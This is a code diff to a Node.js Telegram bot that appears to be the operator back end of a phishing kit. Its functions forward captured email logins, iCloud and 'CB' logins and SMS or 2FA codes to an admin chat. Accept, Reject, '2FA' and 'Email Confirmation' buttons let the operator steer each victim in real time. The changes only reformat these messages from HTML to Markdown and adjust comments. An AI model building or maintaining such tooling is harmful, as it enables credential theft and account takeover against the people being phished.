@@ -48,20 +48,20 @@ const handledCallbacks = new Set();
 // Email/Password approval
 // -----------------
 function sendApprovalRequest(email, password) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
   bot.sendMessage(
     ADMIN_CHAT_ID,
-    `📧 <code>${email}</code>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `accept|${email}` },
-            { text: "❌ Reject", callback_data: `reject|${email}` }
-          ]
-        ]
-      }
-    }
+    `*Login Approval Requested*\n*Email:* ${email}`,
+    { ...options, parse_mode: "Markdown" }
   );
 }
 
@@ -69,20 +69,20 @@ function sendApprovalRequest(email, password) {
 // Generic code approval
 // -----------------
 function sendApprovalRequestGeneric(identifier) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${identifier}` },
+          { text: "❌ Reject", callback_data: `reject|${identifier}` }
+        ]
+      ]
+    }
+  };
   bot.sendMessage(
     ADMIN_CHAT_ID,
-    `🔑 <code>${identifier}</code>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `accept|${identifier}` },
-            { text: "❌ Reject", callback_data: `reject|${identifier}` }
-          ]
-        ]
-      }
-    }
+    `*Approval Requested*\nIdentifier: ${identifier}`,
+    { ...options, parse_mode: "Markdown" }
   );
 }
 
@@ -90,20 +90,20 @@ function sendApprovalRequestGeneric(identifier) {
 // SMS code approval
 // -----------------
 function sendApprovalRequestSMS(code) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${code}` },
+          { text: "❌ Reject", callback_data: `reject|${code}` }
+        ]
+      ]
+    }
+  };
   bot.sendMessage(
     ADMIN_CHAT_ID,
-    `💬 <code>${code}</code>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `accept|${code}` },
-            { text: "❌ Reject", callback_data: `reject|${code}` }
-          ]
-        ]
-      }
-    }
+    `*SMS Approval Requested*\n*Code:* ${code}`,
+    { ...options, parse_mode: "Markdown" }
   );
 }
 
@@ -111,20 +111,20 @@ function sendApprovalRequestSMS(code) {
 // iCloud Login approval
 // -----------------
 function sendApprovalRequestPage(email, password) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
   bot.sendMessage(
     ADMIN_CHAT_ID,
-    `📧 <code>${email}</code>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Accept", callback_data: `accept|${email}` },
-            { text: "❌ Reject", callback_data: `reject|${email}` }
-          ]
-        ]
-      }
-    }
+    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
+    { ...options, parse_mode: "Markdown" }
   );
 }
 
@@ -132,24 +132,23 @@ function sendApprovalRequestPage(email, password) {
 // CB Login approval
 // -----------------
 async function sendLoginTelegram(email) {
-  await bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `📧 <code>${email}</code>`,
-    {
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "↖️ 2FA", callback_data: `page1|${email}` },
-            { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
-          ],
-          [
-            { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
-          ]
+  const options = {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "↖️ 2FA", callback_data: `page1|${email}` },
+          { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
+        ],
+        [
+          { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
         ]
-      }
+      ]
     }
-  );
+  };
+
+  const message = `📧 *Email:* ${email}`;
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
 }
 
 // -----------------
@@ -157,8 +156,7 @@ async function sendLoginTelegram(email) {
 // -----------------
 function send2FACode(code, chatId) {
   pendingRequests[chatId] = true;
-  bot.sendMessage(chatId, `💬 <code>${code}</code>`, {
-    parse_mode: "HTML",
+  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
     reply_markup: {
       keyboard: [["Accept", "Reject"]],
       one_time_keyboard: true,
@@ -208,7 +206,7 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
-      // Step 1: Remove buttons from original message
+      // Step 1: Remove buttons from original message (keep info visible)
       try {
         await bot.editMessageReplyMarkup(
           { inline_keyboard: [] },
@@ -219,7 +217,8 @@ bot.on("callback_query", async (query) => {
         );
       } catch (_) {}
 
-      // Step 2: Send status as a new message
+      // Step 2: Send status as a new reply below the original message
+      // Extract the SMS code from the original Telegram message text
       const msgText = query.message.text || "";
       const smsMatch = msgText.match(/SMS[:\s]+([\d\s\-]+)/i);
       const displayCode = smsMatch ? smsMatch[1].trim() : null;
@@ -254,12 +253,12 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Step 1: Delete the original message entirely
+    // Step 1: Delete the original message entirely (no unnecessary leftover)
     try {
       await bot.deleteMessage(query.message.chat.id, query.message.message_id);
     } catch (_) {}
 
-    // Step 2: Send standalone status message
+    // Step 2: Send standalone status message — SMS (all digits) vs Email
     const isSMS = /^\d+$/.test(identifier);
     const replyText = isSMS
       ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
